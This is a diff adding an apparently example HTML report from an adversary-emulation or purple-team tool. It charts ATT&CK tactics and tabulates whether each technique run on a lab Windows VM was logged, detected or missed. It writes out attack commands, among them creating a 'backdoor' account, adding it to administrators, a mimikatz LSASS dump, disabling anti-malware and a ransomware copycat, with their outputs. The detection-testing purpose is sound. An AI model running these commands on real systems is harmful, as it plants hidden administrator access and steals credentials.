+              <canvas id="tacticDrilldown1460" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1460 = document.getElementById("tacticDrilldown1460").getContext("2d");
+                var datatacticdrilldown1460 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1460 = new Chart(ctxtacticdrilldown1460, {
+                type: 'bar',
+                data: datatacticdrilldown1460,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Collection</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1461" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1461 = document.getElementById("tacticDrilldown1461").getContext("2d");
+                var datatacticdrilldown1461 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1461 = new Chart(ctxtacticdrilldown1461, {
+                type: 'bar',
+                data: datatacticdrilldown1461,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Command and Control</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1462" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1462 = document.getElementById("tacticDrilldown1462").getContext("2d");
+                var datatacticdrilldown1462 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1462 = new Chart(ctxtacticdrilldown1462, {
+                type: 'bar',
+                data: datatacticdrilldown1462,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Exfiltration</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1463" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1463 = document.getElementById("tacticDrilldown1463").getContext("2d");
+                var datatacticdrilldown1463 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1463 = new Chart(ctxtacticdrilldown1463, {
+                type: 'bar',
+                data: datatacticdrilldown1463,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Impact</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1464" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1464 = document.getElementById("tacticDrilldown1464").getContext("2d");
+                var datatacticdrilldown1464 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1464 = new Chart(ctxtacticdrilldown1464, {
+                type: 'bar',
+                data: datatacticdrilldown1464,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+    </div>
+    <hr>
+    
+    
+    <div class="jumbotron">
+ <div class="row">
+            <h2 style="color: #9600FF;">Technique Summary</h2>
+        </div>
+        <div class="row" style="margin-top: 20px;">
+            <style>
+.square {
+  height: 12px;
+  width: 30px;
+}
+</style>
+           <div class="col-md-2"><h6><div class="square" style="background-color: #960505;"></div>Not Detected</h6>
+               </div>
+                       <div class="col-md-2"><h6><div class="square" style="background-color: #d294ff;"></div>Logged</h6>
+               </div>
+                                   <div class="col-md-2"><h6><div class="square" style="background-color: #00690a;"></div>Detected</h6>
+               </div>
+                                               <div class="col-md-2"><h6><div class="square" style="background-color: #021263;"></div>Prevented</h6>
+               </div>
+        </div>
+        <div class="row">
+                
+        <a style="width: 100%;" href="http://localhost:8000/static/3tXoP6ptc50IlOgwlayer.svg"><img type="image" style="width: 100%;" src="Report_Example_PDF_files/3tXoP6ptc50IlOgwlayer.svg"></a>
+        </div>
+    </div>
+    
+        
+    <div class="jumbotron">
+        <div class="row">
+            <h2 style="color: #9600FF;">Technique Drilldown</h2>
+        </div>
+    <div class="row">
+        <div class="col-md-4" align="center">
+                          <canvas id="tecdrill_executed" style="display: block; box-sizing: border-box; height: 337.5px; width: 337.5px;" width="270" height="270"></canvas>
+            <script>
+                    var ctxtecdrill_executed = document.getElementById("tecdrill_executed").getContext("2d");
+                var datatecdrill_executed = {'labels': ['Executed', 'Not Executed'], 'datasets': [{'label': 'Dataset 1', 'data': [8, 1], 'backgroundColor': ['#d294ff', '#707070']}]};
+                const graph_tecdrill_executed = new Chart(ctxtecdrill_executed, {
+                type: 'pie',
+                data: datatecdrill_executed,
+                  options: {
+    responsive: true,
+    plugins: {
+      legend: {
+        position: 'top',
+      },
+      title: {
+        display: true,
+        text: 'Executed vs Not Executed'
+      }
+    }
+  },
+  });
+              </script>
+        </div>
+                <div class="col-md-4" align="center">
+                                              <canvas id="tecdrill_detected" style="display: block; box-sizing: border-box; height: 337.5px; width: 337.5px;" width="270" height="270"></canvas>
+            <script>
+                    var ctxtecdrill_detected = document.getElementById("tecdrill_detected").getContext("2d");
+                var datatecdrill_detected = {'labels': ['Detected', 'Not Detected'], 'datasets': [{'label': 'Dataset 2', 'data': [3, 5], 'backgroundColor': ['#d294ff', '#707070']}]};
+                const graph_tecdrill_detected = new Chart(ctxtecdrill_detected, {
+                type: 'pie',
+                data: datatecdrill_detected,
+                  options: {
+    responsive: true,
+    plugins: {
+      legend: {
+        position: 'top',
+      },
+      title: {
+        display: true,
+        text: 'Detected vs Not Detected'
+      }
+    }
+  },
+  });
+              </script>
+
+        </div>
+                <div class="col-md-4" align="center">
+<canvas id="tecdrill_prevented" style="display: block; box-sizing: border-box; height: 337.5px; width: 337.5px;" width="270" height="270"></canvas>
+            <script>
+                    var ctxtecdrill_prevented = document.getElementById("tecdrill_prevented").getContext("2d");
+                var datatecdrill_prevented = {'labels': ['Prevented', 'Detected'], 'datasets': [{'label': 'Dataset 3', 'data': [0, 3], 'backgroundColor': ['#d294ff', '#707070']}]};
+                const graph_tecdrill_prevented = new Chart(ctxtecdrill_prevented, {
+                type: 'pie',
+                data: datatecdrill_prevented,
+                  options: {
+    responsive: true,
+    plugins: {
+      legend: {
+        position: 'top',
+      },
+      title: {
+        display: true,
+        text: 'Detected vs Prevented'
+      }
+    }
+  },
+  });
+              </script>
+        </div>
+    </div>
+        <div class="row">
+                <div class="col-md-2" align="center">
+
+        </div>
+                            <div class="col-md-4" align="center">
+                                <canvas id="tecdrill_logged" style="display: block; box-sizing: border-box; height: 337.5px; width: 337.5px;" width="270" height="270"></canvas>
+            <script>
+                    var ctxtecdrill_logged = document.getElementById("tecdrill_logged").getContext("2d");
+                var datatecdrill_logged = {'labels': ['Logged', 'Detected', 'Prevented'], 'datasets': [{'label': 'Dataset 4', 'data': [2, 3, 0], 'backgroundColor': ['#d294ff', '#707070', '#c9a800']}]};
+                const graph_tecdrill_logged = new Chart(ctxtecdrill_logged, {
+                type: 'pie',
+                data: datatecdrill_logged,
+                  options: {
+    responsive: true,
+    plugins: {
+      legend: {
+        position: 'top',
+      },
+      title: {
+        display: true,
+        text: 'Logged vs Detected vs Prevented'
+      }
+    }
+  },
+  });
+              </script>
+
+        </div>
+                                                    <div class="col-md-4" align="center">
+  <canvas id="tecdrill_quality" style="display: block; box-sizing: border-box; height: 337.5px; width: 337.5px;" width="270" height="270"></canvas>
+            <script>
+                    var ctxtecdrill_quality = document.getElementById("tecdrill_quality").getContext("2d");
+                var datatecdrill_quality = {'labels': ['Telemetry', 'Tactic', 'Technique'], 'datasets': [{'label': 'Dataset 5', 'data': [2, 3, 0], 'backgroundColor': ['#d294ff', '#707070', '#c9a800']}]};
+                const graph_tecdrill_quality = new Chart(ctxtecdrill_quality, {
+                type: 'pie',
+                data: datatecdrill_quality,
+                  options: {
+    responsive: true,
+    plugins: {
+      legend: {
+        position: 'top',
+      },
+      title: {
+        display: true,
+        text: 'Information Quality'
+      }
+    }
+  },
+  });
+              </script>
+        </div>
+        </div>
+    <div class="row" style="margin-top: 50px;">
+                    <h5 style="color: #9600FF;">Technique Detail</h5>
+    </div>
+        <table class="table table-hover">
+  <thead>
+    <tr>
+      <th scope="col">ATT&amp;CK ID</th>
+      <th scope="col">ATT&amp;CK Name</th>
+      <th scope="col">Technique Name</th>
+        <th scopre="col">Weight</th>
+      <th scope="col">Status</th>
+        <th scope="col">Detection Status</th>
+                <th scope="col">Info Quality</th>
+                <th scope="col">Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+  
+                <tr>
+      <th scope="row">T1033</th>
+      <td>System Owner/User Discovery </td>
+      <td>whoami.exe</td>
+                    <td>Normal</td>
+      <td style="color:green; ">Sucess</td>
+      <td style=" color:DarkGoldenRod; ">Logged</td>
+      <td style="color:DarkGoldenRod; ">Telemetry</td>
+      <td>note example 1</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1087.001</th>
+      <td>Account Discovery - Local Account </td>
+      <td>Local Accounts - net user</td>
+                    <td>High</td>
+      <td style="color:green; ">Sucess</td>
+      <td style="color:green; ">Detected</td>
+      <td style=" color:green; ">Tactic</td>
+      <td>note example2</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1136.001</th>
+      <td>Create Account - Local Account </td>
+      <td>Create account </td>
+                    <td>Normal</td>
+      <td style="color:green; ">Sucess</td>
+      <td style="color:green; ">Detected</td>
+      <td style=" color:green; ">Tactic</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1078.003</th>
+      <td>Valid Accounts - Local Accounts </td>
+      <td>Add created user to admingroup</td>
+                    <td>High</td>
+      <td style="color:green; ">Sucess</td>
+      <td style="color:green; ">Detected</td>
+      <td style=" color:green; ">Tactic</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1057</th>
+      <td>Process Discovery </td>
+      <td>Process Discovery - tasklist</td>
+                    <td>Normal</td>
+      <td style="color:green; ">Sucess</td>
+      <td style=" color:DarkGoldenRod; ">Logged</td>
+      <td style="color:DarkGoldenRod; ">Telemetry</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1562.001</th>
+      <td>Impair Defenses - Disable or Modify Tools </td>
+      <td>Disable Cybereason Anti-malware</td>
+                    <td>High</td>
+      <td style="color:green; ">Sucess</td>
+      <td style=" color:red; ">Not Detected</td>
+      <td style=" color:grey; ">NA</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1003.001</th>
+      <td>OS Credential Dumping - LSASS Memory </td>
+      <td>mimikatz dump</td>
+                    <td>Normal</td>
+      <td style="color:green; ">Sucess</td>
+      <td style=" color:red; ">Not Detected</td>
+      <td style=" color:grey; ">NA</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1547.001</th>
+      <td>Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder </td>
+      <td>Leonidas Autorun</td>
+                    <td>High</td>
+      <td style="color:green; ">Sucess</td>
+      <td style=" color:red; ">Not Detected</td>
+      <td style=" color:grey; ">NA</td>
+      <td>note example</td>
+    </tr>
+  
+                <tr>
+      <th scope="row">T1486</th>
+      <td>Data Encrypted for Impact </td>
+      <td>Deploy Lockbit Copycat</td>
+                    <td>Normal</td>
+      <td style=" color:red; ">Error</td>
+      <td style=" color:grey; ">NA</td>
+      <td style=" color:grey; ">NA</td>
+      <td>note example</td>
+    </tr>
+  
+  </tbody>
+</table>
+            <div class="row" style="margin-top: 50px;">
+                    <h5 style="color: #9600FF;">Technique-by-Technique</h5>
+    </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1033 - System Owner/User Discovery </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">whoami.exe</h4>
+          <h6>Weight: Normal</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Logged</h6>
+          <h6>Modifiers: Telemetry</h6>
+          <p>Notes: note example 1</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: whoami</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+nimitz\\administrator</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1087.001 - Account Discovery - Local Account </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Local Accounts - net user</h4>
+          <h6>Weight: High</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Detected</h6>
+          <h6>Modifiers: Tactic</h6>
+          <p>Notes: note example2</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: net user</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+
+User accounts for \\\\NIMITZ
+
+-------------------------------------------------------------------------------
+Administrator            Administratort           backdoor                 
+DefaultAccount           Guest                    nimitz                   
+test1                    WDAGUtilityAccount       
+The command completed successfully.
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1136.001 - Create Account - Local Account </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Create account </h4>
+          <h6>Weight: Normal</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Detected</h6>
+          <h6>Modifiers: Tactic</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: net user backdoor 123 /add</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+The account already exists.
+
+More help is available by typing NET HELPMSG 2224.
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1078.003 - Valid Accounts - Local Accounts </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Add created user to admingroup</h4>
+          <h6>Weight: High</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Detected</h6>
+          <h6>Modifiers: Tactic</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: net localgroup administrators backdoor /add</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+System error 1378 has occurred.
+
+The specified account name is already a member of the group.
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1057 - Process Discovery </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Process Discovery - tasklist</h4>
+          <h6>Weight: Normal</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Logged</h6>
+          <h6>Modifiers: Telemetry</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: tasklist</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        148 K
+Registry                       108 Services                   0     84,164 K
+smss.exe                       372 Services                   0      1,148 K
+csrss.exe                      480 Services                   0      5,496 K
+wininit.exe                    556 Services                   0      6,376 K
+csrss.exe                      576                            1     11,152 K
+winlogon.exe                   652                            1     11,196 K
+services.exe                   700 Services                   0      9,264 K
+lsass.exe                      720 Services                   0     23,060 K
+svchost.exe                    832 Services                   0     36,764 K
+fontdrvhost.exe                848                            1      3,936 K
+fontdrvhost.exe                856 Services                   0      2,576 K
+svchost.exe                    952 Services                   0     18,152 K
+svchost.exe                   1012 Services                   0     10,668 K
+dwm.exe                        552                            1     49,460 K
+svchost.exe                   1064 Services                   0     11,584 K
+svchost.exe                   1092 Services                   0      5,940 K
+svchost.exe                   1100 Services                   0      5,056 K
+svchost.exe                   1184 Services                   0      9,384 K
+svchost.exe                   1192 Services                   0     11,668 K
+svchost.exe                   1332 Services                   0     15,800 K
+svchost.exe                   1368 Services                   0     16,516 K
+svchost.exe                   1376 Services                   0      6,628 K
+svchost.exe                   1412 Services                   0      7,064 K
+svchost.exe                   1424 Services                   0     14,328 K
+svchost.exe                   1480 Services                   0      6,568 K
+svchost.exe                   1540 Services                   0      9,904 K
+svchost.exe                   1604 Services                   0      7,420 K
+svchost.exe                   1720 Services                   0      8,296 K
+svchost.exe                   1876 Services                   0      7,616 K
+svchost.exe                   1884 Services                   0     11,208 K
+VBoxService.exe               1992 Services                   0      8,044 K
+svchost.exe                   2032 Services                   0      8,224 K
+svchost.exe                   1908 Services                   0      5,664 K
+svchost.exe                   1812 Services                   0      6,892 K
+svchost.exe                   2052 Services                   0     83,892 K
+svchost.exe                   2064 Services                   0      8,980 K
+Memory Compression            2188 Services                   0    499,864 K
+svchost.exe                   2244 Services                   0      7,484 K
+svchost.exe                   2284 Services                   0      7,424 K
+svchost.exe                   2296 Services                   0      7,936 K
+svchost.exe                   2308 Services                   0     10,736 K
+svchost.exe                   2448 Services                   0      7,360 K
+svchost.exe                   2464 Services                   0      9,384 K
+svchost.exe                   2516 Services                   0      6,628 K
+svchost.exe                   2556 Services                   0     12,716 K
+svchost.exe                   2648 Services                   0      8,268 K
+svchost.exe                   2676 Services                   0      8,320 K
+svchost.exe                   2716 Services                   0     21,148 K
+svchost.exe                   2788 Services                   0      6,176 K
+svchost.exe                   2796 Services                   0      9,196 K
+svchost.exe                   2848 Services                   0     19,268 K
+svchost.exe                   3012 Services                   0     12,300 K
+spoolsv.exe                   3048 Services                   0     16,484 K
+svchost.exe                   2352 Services                   0     21,488 K
+svchost.exe                   2544 Services                   0      9,992 K
+svchost.exe                   3428 Services                   0      6,064 K
+svchost.exe                   3536 Services                   0     13,232 K
+svchost.exe                   3552 Services                   0     37,808 K
+svchost.exe                   3564 Services                   0     28,840 K
+dasHost.exe                   3596 Services                   0      9,796 K
+WscIfSvc.exe                  3616 Services                   0      9,184 K
+svchost.exe                   3648 Services                   0      6,188 K
+svchost.exe                   3672 Services                   0      5,360 K
+svchost.exe                   3680 Services                   0      8,992 K
+MsMpEng.exe                   3696 Services                   0     43,336 K
+svchost.exe                   3712 Services                   0     19,896 K
+svchost.exe                   3848 Services                   0     17,604 K
+svchost.exe                   3880 Services                   0     12,076 K
+svchost.exe                   4100 Services                   0      7,124 K
+sihost.exe                    5072                            1     27,664 K
+svchost.exe                   5092                            1     15,264 K
+svchost.exe                   4132                            1     31,720 K
+taskhostw.exe                 4248                            1     21,760 K
+taskhostw.exe                 4408                            1     17,216 K
+svchost.exe                   4400 Services                   0     19,576 K
+svchost.exe                   4692 Services                   0      7,392 K
+svchost.exe                   2008 Services                   0     15,228 K
+explorer.exe                  5148                            1    176,028 K
+svchost.exe                   5244 Services                   0      7,724 K
+svchost.exe                   5464                            1     22,092 K
+svchost.exe                   5888 Services                   0     19,472 K
+StartMenuExperienceHost.e     6048                            1     55,160 K
+RuntimeBroker.exe             5568                            1     25,148 K
+SearchApp.exe                 4976                            1    126,476 K
+RuntimeBroker.exe             6232                            1     43,964 K
+YourPhone.exe                 6520                            1     20,640 K
+SearchIndexer.exe             6800 Services                   0     37,644 K
+svchost.exe                   6824 Services                   0     11,804 K
+RuntimeBroker.exe             7128                            1     15,296 K
+TextInputHost.exe             7208                            1     36,936 K
+dllhost.exe                   7392                            1     12,180 K
+RuntimeBroker.exe             7520                            1     18,512 K
+cmd.exe                       7884                            1      3,608 K
+conhost.exe                   7892                            1     13,580 K
+SecurityHealthSystray.exe     8016                            1      8,964 K
+SecurityHealthService.exe     8052 Services                   0     17,104 K
+VBoxTray.exe                  8124                            1     10,616 K
+OneDrive.exe                  6608                            1     51,604 K
+svchost.exe                   9012 Services                   0      8,200 K
+svchost.exe                   3704 Services                   0      5,836 K
+SystemSettings.exe            4752                            1     44,112 K
+ApplicationFrameHost.exe      2696                            1     29,716 K
+svchost.exe                    492                            1     17,436 K
+svchost.exe                   5484 Services                   0     10,176 K
+svchost.exe                   6168 Services                   0     15,880 K
+SgrmBroker.exe                8764 Services                   0      7,144 K
+uhssvc.exe                    2488 Services                   0      6,096 K
+svchost.exe                   3400 Services                   0     11,432 K
+svchost.exe                   4704 Services                   0     10,336 K
+svchost.exe                   9072 Services                   0     10,436 K
+CredentialEnrollmentManag     4108                            1     10,276 K
+svchost.exe                   8488 Services                   0     10,844 K
+cmd.exe                       1340                            1      3,912 K
+conhost.exe                   8208                            1     16,488 K
+csrss.exe                     6676 Console                    2      6,052 K
+winlogon.exe                  5428 Console                    2     10,348 K
+fontdrvhost.exe               7732 Console                    2      4,300 K
+dwm.exe                       8572 Console                    2     97,288 K
+sihost.exe                    6272 Console                    2     29,036 K
+svchost.exe                   7384 Console                    2     18,000 K
+svchost.exe                   6544 Console                    2     37,748 K
+taskhostw.exe                 7364 Console                    2     15,956 K
+explorer.exe                   604 Console                    2    193,468 K
+svchost.exe                  10668 Console                    2     22,436 K
+TextInputHost.exe            10972 Console                    2     37,240 K
+StartMenuExperienceHost.e    11160 Console                    2     76,100 K
+RuntimeBroker.exe             9232 Console                    2     29,860 K
+dllhost.exe                   7820 Console                    2     15,068 K
+SearchApp.exe                11436 Console                    2     92,532 K
+RuntimeBroker.exe            11520 Console                    2     50,520 K
+RuntimeBroker.exe            12028 Console                    2     18,032 K
+Microsoft.Photos.exe          9904 Console                    2      2,404 K
+RuntimeBroker.exe            12152 Console                    2     27,676 K
+SecurityHealthSystray.exe     7620 Console                    2      9,160 K
+VBoxTray.exe                  7880 Console                    2     10,852 K
+ShellExperienceHost.exe      11572 Console                    2     40,360 K
+RuntimeBroker.exe            10344 Console                    2     16,828 K
+OneDrive.exe                 10264 Console                    2     59,412 K
+svchost.exe                   8452 Console                    2     21,556 K
+ApplicationFrameHost.exe      3592 Console                    2     27,548 K
+svchost.exe                  11388 Services                   0     23,440 K
+cmd.exe                      11288 Console                    2      4,160 K
+conhost.exe                  12184 Console                    2     13,384 K
+Calculator.exe               12012                            1      1,984 K
+RuntimeBroker.exe             7628                            1      6,476 K
+Autoruns.exe                  5264                            1     23,788 K
+regedit.exe                   5276                            1     21,620 K
+cmd.exe                      10772                            1      3,976 K
+conhost.exe                   7756                            1     16,604 K
+YourPhone.exe                 2668 Console                    2     10,824 K
+cmd.exe                       3100                            1      3,992 K
+conhost.exe                   6104                            1     13,836 K
+Microsoft.Photos.exe          2688                            1      2,140 K
+RuntimeBroker.exe             2588                            1     18,844 K
+ShellExperienceHost.exe       5128                            1     40,888 K
+RuntimeBroker.exe             1420                            1     16,832 K
+svchost.exe                   7412 Services                   0     18,596 K
+RuntimeBroker.exe             3940 Console                    2     11,520 K
+cmd.exe                       3872 Console                    2      4,740 K
+conhost.exe                   2336 Console                    2     20,704 K
+SystemSettings.exe            9440 Console                    2      2,068 K
+msedge.exe                   10576 Console                    2     75,392 K
+msedge.exe                   11092 Console                    2      7,312 K
+msedge.exe                    2120 Console                    2     24,272 K
+msedge.exe                    2896 Console                    2     28,756 K
+msedge.exe                    3324 Console                    2     17,052 K
+devenv.exe                    9124                            1    644,860 K
+PerfWatson2.exe               7452                            1     58,396 K
+Microsoft.ServiceHub.Cont     4960                            1     62,224 K
+ServiceHub.VSDetouredHost     9368                            1     86,060 K
+ServiceHub.ThreadedWaitDi     1816                            1     74,416 K
+vcpkgsrv.exe                  9484                            1     11,296 K
+ServiceHub.IndexingServic     1492                            1     87,696 K
+ServiceHub.IdentityHost.e    11612                            1     69,824 K
+ServiceHub.Host.CLR.x64.e     8816                            1     74,328 K
+ServiceHub.Host.CLR.exe       6776                            1     64,872 K
+ServiceHub.SettingsHost.e     5240                            1     65,840 K
+ServiceHub.Host.CLR.x86.e     9620                            1     67,228 K
+ServiceHub.DataWarehouseH    11508                            1     90,452 K
+VsDebugConsole.exe            2440                            1      5,356 K
+conhost.exe                   6312                            1     13,216 K
+WebViewHost.exe               8084                            1     37,172 K
+ServiceHub.Host.CLR.exe       3128                            1     88,796 K
+ServiceHub.TestWindowStor     3868                            1     66,184 K
+msedgewebview2.exe           10116                            1     95,244 K
+msedgewebview2.exe             744                            1      6,904 K
+msedgewebview2.exe            2628                            1     37,232 K
+msedgewebview2.exe            5004                            1     28,452 K
+msedgewebview2.exe            7980                            1     17,888 K
+msedgewebview2.exe            5692                            1     55,820 K
+msedgewebview2.exe            7340                            1     46,500 K
+vcpkgsrv.exe                  5144                            1     58,908 K
+cmd.exe                       3260                            1      3,992 K
+conhost.exe                   3832                            1     13,552 K
